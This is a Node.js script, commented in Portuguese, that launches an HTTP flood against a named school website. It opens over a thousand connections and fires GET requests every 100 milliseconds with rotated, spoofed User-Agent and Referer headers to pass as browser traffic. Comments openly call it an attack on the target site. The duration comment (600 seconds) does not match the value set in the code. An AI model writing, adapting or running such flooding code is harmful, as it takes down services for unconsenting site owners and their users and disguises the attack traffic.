const WebSocket = require('ws');
const http = require('http');
const url = require('url');

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
];

const referers = [
  'https://www.google.com/',
  'https://www.bing.com/',
  'https://www.yahoo.com/',
  'https://www.facebook.com/',
  'https://www.twitter.com/',
  'https://www.youtube.com/',
  'https://www.example.com/',
];

const targetUrl = 'https://ecoescolas.abaae.pt/'; // URL do seu site alvo
const attackDuration = 6000000; // 600 segundos

const sockets = [];
for (let i = 0; i < 1124; i++) {
  const socket = new WebSocket('ws://yourwebsocketserver.com');
  sockets.push(socket);
}

sockets.forEach((socket) => {
  socket.on('open', () => {
    console.log('WebSocket connected');
    const interval = setInterval(() => {
      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
      const referer = referers[Math.floor(Math.random() * referers.length)];

      const parsedUrl = url.parse(targetUrl);
      const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port,
        path: parsedUrl.path,
        method: 'GET',
        headers: {
          'User-Agent': userAgent,
          'Referer': referer
        }
      };

      const req = http.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
      });

      req.on('error', (err) => {
        console.error('Request error:', err.message);
      });

      req.end();
    }, 100); // Enviar uma solicitação a cada 100 milissegundos

    setTimeout(() => {
      clearInterval(interval); // Parar o ataque após 600 segundos
      socket.close();
    }, attackDuration);
  });

  socket.on('error', (err) => {
    console.error('WebSocket error:', err.message);
  });

  socket.on('close', () => {
    console.log('WebSocket closed');
  });
});